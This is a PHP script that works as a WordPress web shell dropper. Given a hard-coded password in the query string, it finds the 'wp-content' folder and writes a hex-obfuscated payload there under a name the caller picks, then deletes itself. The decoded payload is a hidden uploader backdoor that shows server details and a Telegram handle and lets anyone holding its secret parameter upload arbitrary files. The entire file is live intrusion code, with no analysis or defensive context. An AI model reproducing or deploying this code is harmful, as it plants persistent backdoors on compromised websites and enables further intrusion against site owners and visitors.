<?php

$self = getcwd() . "/" . basename($_SERVER['PHP_SELF']);

if (isset($_GET['filename']) && isset($_GET['pass'])) {
	if ($_GET['pass'] == 'x') {

		function get_file_name() {
			$filename = $_GET['filename'];
			return $filename;
		}

		function basedirname($path) {
			$path = explode("/", $path);
			$newpath = end($path) . "/";
			return $newpath;
		}

		function write_contents() {
			$file_content = "3C3F706870200D0A69662028245F4745545B27456E6665726E616C275D203D3D2027457827297B0D0A202020206563686F20273C7072653E3C703E54656C656772616D203A20404E304E4C3043344C3C2F703E272E7068705F756E616D6528292E225C6E222E273C62722F3E3C666F726D206D6574686F643D22706F73742220656E63747970653D226D756C7469706172742F666F726D2D64617461223E3C696E70757420747970653D2266696C6522206E616D653D225F5F223E3C696E707574206E616D653D225F2220747970653D227375626D6974222076616C75653D2255706C6F6164223E3C2F666F726D3E273B696628245F504F5354297B69662840636F707928245F46494C45535B275F5F275D5B27746D705F6E616D65275D2C20245F46494C45535B275F5F275D5B276E616D65275D29297B6563686F202755706C6F61646564273B7D656C73657B6563686F20274E6F742055706C6F61646564273B7D7D0D0A7D0D0A3F3E0D0A";
			$dir = str_replace("\\" , "/", getcwd());
			$dir_array = explode("/", $dir);
			foreach ($dir_array as $folder) {
				$newfolder = basedirname($dir);
				if ($newfolder == "wp-content/") {
					if (file_put_contents(get_file_name(), hex2bin($file_content))) {
						return true;
					}
					else {
						return false;
					}
				}
				else {
					chdir($dir . "/..");
					array_pop($dir_array);
					$dir = implode("/", $dir_array);
				}
			} 
		}

		if (write_contents()) {
			echo "File successfully writed :D";
			unlink($self);
		}
		else {
			echo "File writing failed :(";
			unlink($self);
		}
	} 
	else {
		// pass
	}
}
?>